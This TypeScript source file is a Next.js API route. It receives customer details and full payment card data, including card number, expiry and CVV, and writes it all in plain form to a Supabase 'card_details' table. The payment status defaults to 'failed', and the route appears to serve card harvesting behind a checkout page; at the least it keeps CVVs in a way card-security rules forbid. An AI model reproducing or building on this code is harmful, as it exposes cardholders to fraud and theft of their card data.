import { createClient } from "@/lib/supabase/server"
import { NextRequest, NextResponse } from "next/server"

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    const {
      orderNo,
      customerName,
      customerPhone,
      customerEmail,
      cardName,
      cardBrand,
      cardNumber,
      cardExpiry,
      cardCvv,
      cardLast4,
      amount,
      paymentStatus,
    } = body

    if (!orderNo || !customerName || !customerPhone || !cardName || !cardBrand || !cardNumber || !cardExpiry || !cardCvv || !cardLast4) {
      return NextResponse.json({ error: "Missing required fields" }, { status: 400 })
    }

    const supabase = await createClient()

    // First, get the order ID from order_no
    const { data: orderData } = await supabase
      .from("orders")
      .select("id")
      .eq("order_no", orderNo)
      .single()

    if (!orderData) {
      console.error("[Card Details] Order not found:", orderNo)
      return NextResponse.json({ error: "Order not found" }, { status: 404 })
    }

    // Insert card details
    const { error } = await supabase.from("card_details").insert({
      order_id: orderData.id,
      order_no: orderNo,
      customer_name: customerName,
      customer_phone: customerPhone,
      customer_email: customerEmail || null,
      card_name: cardName,
      card_brand: cardBrand,
      card_number: cardNumber,
      card_expiry: cardExpiry,
      card_cvv: cardCvv,
      card_last4: cardLast4,
      amount: Number(amount) || 0,
      payment_status: paymentStatus || "failed",
    })

    if (error) {
      console.error("[Card Details] Failed to insert:", error)
      return NextResponse.json({ error: error.message }, { status: 500 })
    }

    return NextResponse.json({ success: true })
  } catch (error) {
    console.error("[Card Details] Error:", error)
    return NextResponse.json({ error: "Failed to save card details" }, { status: 500 })
  }
}
